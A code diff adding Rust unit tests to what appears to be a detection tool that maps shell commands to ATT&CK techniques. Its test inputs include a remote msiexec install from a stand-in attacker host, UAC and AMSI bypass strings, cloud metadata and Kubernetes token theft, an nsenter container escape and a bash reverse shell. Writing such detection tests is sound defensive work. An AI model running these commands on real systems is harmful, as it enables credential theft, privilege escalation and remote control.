@@ -210,6 +210,59 @@ mod tests {
     }
 
     #[test]
+    fn windows_kb_detects_lolbins_and_uac_bypass() {
+        // Remote MSI install (LOLBin proxy execution).
+        let msi = analyze("msiexec /q /i http://evil.example/x.msi", &win_kb());
+        let f = msi
+            .findings
+            .iter()
+            .find(|f| f.rule_id == "msiexec-remote")
+            .expect("msiexec remote install should be detected");
+        assert_eq!(f.techniques[0].id, "T1218.007");
+
+        // UAC bypass and AMSI bypass.
+        let uac = analyze("C:\\Windows\\System32\\fodhelper.exe", &win_kb());
+        assert!(
+            uac.findings
+                .iter()
+                .any(|f| f.rule_id == "uac-bypass-fodhelper")
+        );
+        let amsi = analyze(
+            "[Ref].Assembly...SetValue($null,$true) amsiInitFailed",
+            &win_kb(),
+        );
+        assert!(amsi.findings.iter().any(|f| f.rule_id == "amsi-bypass"));
+    }
+
+    #[test]
+    fn linux_kb_detects_cloud_and_container_tradecraft() {
+        // Cloud instance metadata credential theft.
+        let imds = analyze("curl http://169.254.169.254/latest/meta-data/iam/", &kb());
+        let f = imds
+            .findings
+            .iter()
+            .find(|f| f.rule_id == "cloud-imds")
+            .expect("cloud metadata access should be detected");
+        assert_eq!(f.techniques[0].id, "T1552.005");
+
+        // Kubernetes service-account token theft.
+        let tok = analyze(
+            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+            &kb(),
+        );
+        assert!(tok.findings.iter().any(|f| f.rule_id == "k8s-sa-token"));
+
+        // Container escape via nsenter into host namespaces.
+        let esc = analyze("nsenter --target 1 --mount --net -- bash", &kb());
+        let f = esc
+            .findings
+            .iter()
+            .find(|f| f.rule_id == "nsenter-escape")
+            .unwrap();
+        assert_eq!(f.techniques[0].id, "T1611");
+    }
+
+    #[test]
     fn detects_reverse_shell() {
         let report = analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", &kb());
         assert!(
